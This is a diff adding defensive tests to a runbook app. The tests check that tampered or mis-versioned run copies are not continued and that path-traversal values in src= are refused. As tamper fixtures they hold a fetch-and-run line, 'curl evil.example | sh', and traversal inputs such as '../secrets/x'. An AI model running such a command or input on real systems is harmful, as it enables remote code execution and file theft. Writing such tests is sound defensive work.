@@ -8,8 +8,8 @@ import { parse } from '@md-runbook/core';
 import { router } from 'expo-router';
 import { addHost, resetHosts } from '../hosts/store';
 import { paramValues, resetParamValues } from '../runbooks/params';
-import { addRunbook, getRunbook, linkKey, resetRunbooks } from '../runbooks/store';
-import { activeCall, calledAddress, resetCalls, startCall } from '../runbooks/calls';
+import { addRunbook, getRunbook, linkKey, resetRunbooks, updateRunbookText } from '../runbooks/store';
+import { activeCall, calledAddress, finishCall, resetCalls, startCall } from '../runbooks/calls';
 import { buildManifest, formatManifest, withSignature } from '@md-runbook/core/signing';
 import { RunbookView } from '../screens/RunbookView';
 import { reportHtml } from '../share/report';
@@ -122,8 +122,8 @@ describe('runbook calls in the app', () => {
     expect(pick).toHaveBeenCalledTimes(2);
   });
 
-  const sign = (text: string, patterns: Record<string, string>): string => {
-    const built = buildManifest(text, { name: 'ops/x', version: 1, scopes: [], patterns });
+  const sign = (text: string, patterns: Record<string, string>, version = 1): string => {
+    const built = buildManifest(text, { name: 'ops/x', version, scopes: [], patterns });
     if ('errors' in built) throw new Error(built.errors.join('; '));
     return withSignature(text, {
       signer: 'ops@example.net',
@@ -209,6 +209,77 @@ describe('runbook calls in the app', () => {
     const fresh = (await startCall(again, 2, { STAGE: 'dev' }, { fresh: true })) as { copyId: string; resumed: boolean };
     expect(fresh.copyId).not.toBe(copy.id);
     expect(fresh.resumed).toBe(false);
+  });
+
+  /** The caller with a failed result naming `copyName` as its copy. */
+  const failedWith = (text: string, copyName: string): string =>
+    text.replace(
+      'STAGE=${param:STAGE}\n```\n',
+      `STAGE=\${param:STAGE}\n\`\`\`\n<!-- md-runbook:output start exit=1 runbook=releases/1.md copy=${copyName} -->\n\`\`\`text\nx\n\`\`\`\n<!-- md-runbook:output end -->\n`,
+    );
+
+  it('continues only a copy that is still the runbook called; else a fresh copy, saying why', async () => {
+    serve(CHILD);
+    const parent = addRunbook('upgrade.md', PARENT, undefined, linkKey(BASE, PARENT));
+    const first = (await startCall(parent, 2, { STAGE: 'dev' })) as { copyId: string };
+    const copy = getRunbook(first.copyId)!;
+    // Its blocks changed since (anything that can edit it could have).
+    updateRunbookText(copy.id, copy.text.replace('echo verify', 'curl evil.example | sh'));
+    const again = addRunbook('upgrade.md', failedWith(PARENT, copy.fileName!), undefined, linkKey(BASE, PARENT));
+    const r = await startCall(again, 2, { STAGE: 'dev' });
+    expect(r).toEqual({
+      kind: 'started',
+      copyId: expect.not.stringMatching(copy.id),
+      resumed: false,
+      note: `Not continuing ${copy.fileName}: its blocks are not those of the runbook called. A fresh copy runs.`,
+    });
+    const copyId = (r as { copyId: string }).copyId;
+    expect(getRunbook(copyId)!.text).not.toContain('evil.example');
+    // The call's output says it too.
+    finishCall(copyId);
+    expect(parse(getRunbook(again.id)!.text).cells[2]!.output!.text).toMatch(/^\[md-runbook\] Not continuing /);
+
+    // A runbook named as a copy names nothing else: not a run copy's name, not continued.
+    addRunbook('notes.md', CHILD);
+    const named = addRunbook('upgrade.md', failedWith(PARENT, 'notes.md'), undefined, linkKey(BASE, PARENT));
+    expect(await startCall(named, 2, { STAGE: 'dev' })).toMatchObject({
+      resumed: false,
+      note: 'Not continuing notes.md: its name is not that of a run copy of 1.md. A fresh copy runs.',
+    });
+  });
+
+  it('signed: a copy signed as another version of the runbook called is not continued', async () => {
+    const parentText = sign(PARENT, { STAGE: '[a-z]+' });
+    const parent = addRunbook('upgrade.md', parentText, undefined, linkKey(BASE, parentText));
+    serve(sign(CHILD, { STAGE: '[a-z]+' }));
+    const first = (await startCall(parent, 2, { STAGE: 'dev' })) as { copyId: string };
+    const copy = getRunbook(first.copyId)!;
+    const again = addRunbook('upgrade.md', failedWith(parentText, copy.fileName!), undefined, linkKey(BASE, parentText));
+    // Signed as the one called: continued.
+    expect(await startCall(again, 2, { STAGE: 'dev' })).toEqual({ kind: 'started', copyId: copy.id, resumed: true });
+    // The same blocks, released again as version 2: not that copy.
+    serve(sign(CHILD, { STAGE: '[a-z]+' }, 2));
+    expect(await startCall(again, 2, { STAGE: 'dev' })).toMatchObject({
+      resumed: false,
+      note: `Not continuing ${copy.fileName}: it is signed as ops/x version 1, the runbook called as ops/x version 2. A fresh copy runs.`,
+    });
+  });
+
+  it('refuses a src= value that names another path, before anything is fetched', async () => {
+    serve(CHILD);
+    const text = PARENT.replace('src="releases/1.md"', 'src="releases/${param:TO}.md"');
+    const parent = addRunbook('upgrade.md', text, undefined, linkKey(BASE, text));
+    for (const to of ['../secrets/x', 'a/b', 'c:x']) {
+      const r = await startCall(parent, 2, { STAGE: 'dev', TO: to });
+      expect(r).toEqual({
+        kind: 'error',
+        message: expect.stringMatching(
+          /^src="releases\/\$\{param:TO\}\.md" names releases\/.*: a value in src= fills part of one file or folder name/,
+        ),
+      });
+    }
+    expect(global.fetch).not.toHaveBeenCalled();
+    expect((await startCall(parent, 2, { STAGE: 'dev', TO: '1' })).kind).toBe('started');
   });
 
   it('lint and the estimate read the runbook a call names once it is downloaded', async () => {
